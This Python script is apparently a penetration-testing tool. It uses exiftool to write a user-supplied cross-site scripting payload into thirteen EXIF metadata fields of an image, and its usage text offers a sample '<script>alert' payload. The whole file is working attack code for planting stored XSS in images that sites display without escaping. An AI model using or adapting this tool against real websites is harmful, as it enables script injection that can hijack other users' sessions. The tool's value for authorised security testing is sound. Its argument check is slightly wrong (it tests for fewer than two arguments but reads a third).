#!/usr/bin/python
import sys
import subprocess

class bcolors:
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    FAIL = '\033[91m'
    ENDC = '\033[0m'
    BOLD = '\033[1m'
    UNDERLINE = '\033[4m'

if(len(sys.argv) < 2):
    print("Usage: %s IMAGEPATH XSSCODE\n" % sys.argv[0])
    print("Eg:    %s test.jpg '<script>alert(\"XSS\");</script>'" % sys.argv[0])
    exit()

exifs = [
   "ImageDescription",
   "Make",
   "Model",
   "Software",
   "Artist",
   "Copyright",
   "XPTitle",
   "XPComment",
   "XPAuthor",
   "XPSubject",
   "Location",
   "Description",
   "Author"
]
 
if sys.argv[1] and sys.argv[2]:
    image = sys.argv[1]
    xss = sys.argv[2]
 
    for exif in exifs:
        attribute = "-{0}={1}".format(exif, xss)
        try:
          subprocess.call(["exiftool", attribute, image])
        except: 
          print bcolors.FAIL + "No exiftool installed or found" + bcolors.ENDC
          exit()
    try:
      subprocess.call(["exiftool", image])
    except: 
          print "No exiftool installed or found"
          exit()
else:
    print("No source image given")